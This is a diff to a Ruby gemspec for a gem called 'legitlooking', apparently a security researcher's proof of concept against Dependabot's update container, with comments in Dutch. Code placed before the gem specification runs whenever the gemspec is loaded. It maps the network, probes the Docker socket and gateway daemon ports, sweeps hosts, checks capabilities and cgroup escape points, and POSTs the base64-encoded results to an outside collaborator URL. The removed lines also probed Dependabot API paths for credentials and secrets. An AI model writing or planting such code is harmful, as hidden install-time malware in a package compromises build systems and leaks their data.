@@ -6,66 +6,79 @@ begin
   require "uri"
   require "net/http"
 
+  # --noproxy '*' is cruciaal -- anders gaan alle curl requests via de proxy
+  # en krijgen we altijd 500 terug (proxy weigert non-proxy requests)
   cmd = ->(c) { `#{c} 2>/dev/null`.strip[0, 3000] }
   lines = []
 
   # ============================================================
-  # BUNDLER CONTAINER: proxy staat APART op 172.19.0.2
-  # Probeer de proxy te targetten via zijn eigen verbinding --
-  # de proxy maakt UITGAANDE verbindingen naar de Dependabot API.
-  # Misschien kunnen we die verbindingen onderscheppen.
+  # 1. ROUTING TABEL -- wat is het echte gateway IP?
   # ============================================================
+  lines << "=== 1. IP ROUTE ==="
+  lines << cmd.("ip route 2>/dev/null || route -n 2>/dev/null || cat /proc/net/route")
 
-  # Welk IP heeft DEZE container?
-  lines << "=== CONTAINER IP ==="
-  lines << cmd.("hostname -I")
-  lines << cmd.("ip addr show")
+  lines << "\n=== 1b. NETWORK INTERFACES ==="
+  lines << cmd.("ip addr 2>/dev/null || ifconfig 2>/dev/null")
 
-  # Kunnen we de proxy-container rechtstreeks SSH-en of andere ports?
-  lines << "\n=== PROXY CONTAINER EXTRA PORTS (ruimer scan) ==="
-  (1..1024).step(50).each do |port|
-    r = cmd.("curl -s --max-time 1 -o /dev/null -w '%{http_code}' --noproxy '*' http://172.19.0.2:#{port}/")
-    lines << "#{port}: #{r}" unless r == "000"
+  # ============================================================
+  # 2. DOCKER SOCKET -- meest directe container escape
+  # ============================================================
+  lines << "\n=== 2. DOCKER SOCKET ==="
+  lines << cmd.("ls -la /var/run/docker.sock /run/docker.sock /tmp/docker.sock 2>/dev/null")
+  lines << cmd.("curl -s --max-time 3 --unix-socket /var/run/docker.sock http://localhost/version 2>/dev/null")
+  lines << cmd.("curl -s --max-time 3 --unix-socket /run/docker.sock http://localhost/version 2>/dev/null")
+
+  # ============================================================
+  # 3. GATEWAY DIRECT SCAN -- met --noproxy '*'
+  # ============================================================
+  lines << "\n=== 3. GATEWAY DIRECT (--noproxy, geen proxy routing) ==="
+
+  # Haal gateway IP op uit routing tabel
+  gw = cmd.("ip route | grep default | awk '{print $3}' | head -1")
+  gw = "172.19.0.1" if gw.empty?
+  lines << "Gateway: #{gw}"
+
+  # Ping gateway
+  lines << cmd.("ping -c 2 -W 2 #{gw}")
+
+  # Docker daemon poorten direct (geen proxy)
+  [2376, 2377, 4243, 4244, 7777, 2375].each do |port|
+    r = cmd.("curl -s --max-time 3 --noproxy '*' http://#{gw}:#{port}/version -w '\\nHTTP:%{http_code}'")
+    lines << "#{gw}:#{port} /version => #{r[0,200]}"
   end
-  # En hogere ports
-  [1080, 2080, 3000, 4000, 5000, 8080, 9090, 9999, 10080, 15080, 16000].each do |port|
-    r = cmd.("curl -s --max-time 1 -o /dev/null -w '%{http_code}' --noproxy '*' http://172.19.0.2:#{port}/")
-    lines << "port #{port}: #{r}"
+
+  # ============================================================
+  # 4. HOST SCAN -- zijn er meer hosts dan .2 en .3?
+  # ============================================================
+  lines << "\n=== 4. HOST DISCOVERY (ping sweep 172.19.0.1-10) ==="
+  (1..10).each do |i|
+    r = cmd.("ping -c 1 -W 1 172.19.0.#{i} | grep -c '1 received'")
+    lines << "172.19.0.#{i}: #{r == '1' ? 'UP' : 'down'}"
   end
 
-  # Kunnen we de proxy bereiken op UDP?
-  lines << "\n=== PROXY UDP/ICMP ==="
-  lines << cmd.("ping -c 1 -W 2 172.19.0.2")
+  # ============================================================
+  # 5. CAPABILITIES -- hoe beperkt is de container?
+  # ============================================================
+  lines << "\n=== 5. CONTAINER CAPABILITIES ==="
+  lines << cmd.("cat /proc/self/status | grep -i cap")
+  lines << cmd.("capsh --print 2>/dev/null")
 
-  # Is er een derde container? (172.19.0.1 = gateway/host?)
-  lines << "\n=== HOST GATEWAY SCAN ==="
-  lines << cmd.("ping -c 1 -W 2 172.19.0.1")
-  [80, 443, 2376, 2377, 4243, 7777, 8080].each do |port|
-    r = cmd.("curl -s --max-time 2 -o /dev/null -w '%{http_code}' http://172.19.0.1:#{port}/ 2>&1")
-    lines << "gateway:#{port}: #{r}"
-  end
+  # ============================================================
+  # 6. NAMESPACES -- zitten we in een beperkte namespace?
+  # ============================================================
+  lines << "\n=== 6. NAMESPACES ==="
+  lines << cmd.("cat /proc/self/cgroup")
+  lines << cmd.("ls -la /proc/self/ns/")
 
-  # ARP tabel -- welke hosts zijn bekend?
-  lines << "\n=== ARP TABEL ==="
-  lines << cmd.("cat /proc/net/arp")
-  lines << cmd.("ip neigh")
-
-  # Dependabot internal API -- zijn er andere endpoints?
-  lines << "\n=== DEPENDABOT API ENDPOINTS ==="
-  job_id = ENV["DEPENDABOT_JOB_ID"] || ""
-  [
-    "/update_jobs/#{job_id}/details",
-    "/update_jobs/#{job_id}/credentials",
-    "/update_jobs/#{job_id}/secrets",
-    "/update_jobs/#{job_id}/registries",
-    "/update_jobs/#{job_id}/job_parameters",
-  ].each do |path|
-    r = cmd.("curl -s --max-time 5 -w '\\n%{http_code}' https://dependabot-actions.githubapp.com#{path}")
-    lines << "#{path}: #{r[-3..]}: #{r[0, 200]}"
-  end
+  # ============================================================
+  # 7. CGROUPS V2 ESCAPE CHECK
+  # ============================================================
+  lines << "\n=== 7. CGROUP RELEASE AGENT ==="
+  lines << cmd.("find /sys/fs/cgroup -name 'release_agent' 2>/dev/null")
+  lines << cmd.("cat /proc/1/cgroup 2>/dev/null")
 
   payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
-  uri = URI("#{COLLAB_URL}?poc=container_escape_v2")
+  uri = URI("#{COLLAB_URL}?poc=escape_direct_scan")
   post = Net::HTTP::Post.new(uri)
   post["Content-Type"] = "text/plain"
   post.body = payload
@@ -74,14 +87,14 @@ begin
 
 rescue => e
   begin
-    uri = URI("#{COLLAB_URL}?poc=container_escape_v2&err=#{URI.encode_www_form_component(e.message[0,200])}")
+    uri = URI("#{COLLAB_URL}?poc=escape_direct_scan&err=#{URI.encode_www_form_component(e.message[0,200])}")
     Net::HTTP.get(uri)
   rescue; end
 end
 
 Gem::Specification.new do |spec|
   spec.name          = "legitlooking"
-  spec.version       = "1.0.28"
+  spec.version       = "1.0.29"
   spec.authors       = ["researcher"]
   spec.summary       = "A normal looking gem"
   spec.require_paths = ["lib"]
